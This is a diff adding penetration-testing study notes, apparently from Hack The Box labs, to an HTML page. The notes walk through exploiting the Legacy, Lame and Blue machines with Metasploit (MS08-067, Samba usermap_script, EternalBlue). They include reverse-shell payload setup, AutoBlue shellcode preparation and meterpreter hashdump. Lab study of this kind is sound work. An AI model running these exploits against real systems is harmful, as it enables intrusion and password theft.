@@ -1,11 +1,134 @@
-<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>assessments</title>
 </head><body><b>Active machines: </b>are the machines that are currently active and can be attacked by anybody<br/>
 <br/>
 --&gt;the caveat is a lot of these machines are super unrealistic<br/>
 <br/>
-<b>Retired machine:</b>is somebody has probably already done it and can have a walkthrough<br/>
+<b>Retired machine:</b>&nbsp;is somebody has probably already done it and can have a walkthrough, need premium subscription to practice<br/>
 <br/>
-<b>CTF: </b>it's basically a bunch of challenges where you score points for solving problems</body></html>
+<b>CTF: </b>it's basically a bunch of challenges where you score points for solving problems<br/>
+<br/>
+--------------------------------------------------------------------------------------------------------------------<br/>
+<b>Legacy machine<br/>
+<br/>
+</b>#nmap -A -T4 -p- 10.10.10.4<br/>
+(what we're doing here is we are looking for open ports, nmap can run on the TCP side we scan all 65535 ports in this example if you want to scan against UDP side: nmap -sU -A -T4 -p- 10.10.10.4)<br/>
+<br/>
+three way handshake revision:<br/>
+SYN--&gt;SYN ACK--&gt;ACK<br/>
+<br/>
+#smbclient -L \\\\10.10.10.4\\<br/>
+(if you can't access we can enumerate)<br/>
+#smbclient \\\\10.10.10.4\\$ADMIN<br/>
+#msfconsole<br/>
+#search smb_version<br/>
+msf5&gt;use auxiliary/scanner/smb/smb_version<br/>
+msf5 auxiliary(scanner/smb/smb_version)&gt;options<br/>
+&gt;set rhosts 10.10.10.4<br/>
+&gt;options<br/>
+&gt;exploit<br/>
+--&gt;google: smb windows xp sp3 exploit<br/>
+&gt;use exploit/windows/smb/ms08_067_netapi<br/>
+&gt;set rhosts 10.10.10.4<br/>
+&gt;run<br/>
+meterpreter&gt;getuid<br/>
+meterpreter&gt;sysinfo<br/>
+meterpreter&gt;help<br/>
+meterpreter&gt;hashdump<br/>
+(to crack users passwords of machine)<br/>
+meterpreter&gt;shell<br/>
+<br/>
+<b>auxiliary</b>--&gt;are scanning, enumeration, information gathering<br/>
+<br/>
+--&gt;there is two shells that we can run reverse shell and bind shell, the majority of your time when you're doing lab testing is going to be running with reverse shells<br/>
+------------------------------------------------------------------------------<br/>
+<b>Lame machine<br/>
+<br/>
+</b>#nmap -A -T4 -p- 10.10.10.3<br/>
+<br/>
+<b>21/tcp open FTP</b>--&gt;not expolitable enough, because you can put files on the server but you need to do some social engineering to make someone execute it<br/>
+<br/>
+<b>22/tcp open ssh</b>--&gt;not we are looking for when we do exploitation<br/>
+<br/>
+#smbclient -L \\\\10.10.10.3\\<br/>
+<br/>
+--&gt;google: Samba 3.0.20-Debian exploit<br/>
+#msfconsole<br/>
+msf5&gt;use exploit/multi/samba/usermap_script<br/>
+msf5 exploit(......)&gt;options<br/>
+&gt;set rhosts 10.10.10.3<br/>
+&gt;show targets<br/>
+&gt;run<br/>
+whoami<br/>
+root<br/>
+hostname<br/>
+lame<br/>
+pwd<br/>
+/<br/>
+-----------------------------------------------------------------------------------------<br/>
+<b>Blue machine<br/>
+<br/>
+</b>#nmap -A -T4 -p- 10.10.10.40<br/>
+#msfconsole<br/>
+msf5&gt;search ms17-010<br/>
+msf5&gt;use auxiliary/scanner/smb/smb17_010<br/>
+&gt;options<br/>
+&gt;set rhosts 10.10.10.40<br/>
+&gt;options<br/>
+&gt;run<br/>
+&gt;use exploit/windows/smb/ms17_010_eternalblue<br/>
+&gt;set rhosts 10.10.10.40<br/>
+&gt;show targets<br/>
+&gt;run<br/>
+&gt;options<br/>
+&gt;set payload windows/x64/meterpreter/<br/>
+&gt;set payload windows/x64/meterpreter/reverse_tcp<br/>
+&gt;options<br/>
+&gt;run<br/>
+meterpreter&gt;getuid<br/>
+meterpreter&gt;sysinfo<br/>
+meterpreter&gt;hashdump<br/>
+meterpreter&gt;shell<br/>
+&gt;arp -a<br/>
+&gt;netstat -ano<br/>
+&gt;exit<br/>
+-------------------------------------------------------------------<br/>
+another manual way:<br/>
+<br/>
+#cd /opt/<br/>
+#cd AutoBlue-MS17-010/<br/>
+#ls<br/>
+#python eternalblue_checker.py 10.10.10.40<br/>
+#cd shellcode/<br/>
+#./shell_prep.sh<br/>
+y<br/>
+&lt;your ip address&gt;<br/>
+4445<br/>
+4446<br/>
+0<br/>
+0<br/>
+#cd ..<br/>
+#ls<br/>
+#./listener_prep.sh<br/>
+&lt;your ip address&gt;<br/>
+4445<br/>
+4446<br/>
+0<br/>
+0<br/>
+#cd ..<br/>
+#ls<br/>
+#python eternablue_exploit7.py 10.10.10.40 shellcode/sc_all.bin<br/>
+&gt;sessions<br/>
+&gt;sessions 1<br/>
+&gt;getuid<br/>
+&gt;sysinfo<br/>
+------------------------------------------------------------------<br/>
+new tab to know your ip address:<br/>
+#ifconfig<br/>
+<br/>
+<br/>
+<b><span style="font-size: 13pt">PID</span></b>--&gt;T<span style="font-size: 13pt"><span style="font-family: arial"><div style="text-align: left">he process identifier (a.k.a. process ID or </div></span><b>PID</b><div style="text-align: left"><span style="font-family: arial">) is a number used by most operating system kernels—such as those of Unix, macOS and Windows—to uniquely identify an active process.</span></div></span>&nbsp; <br/>
+</body></html>
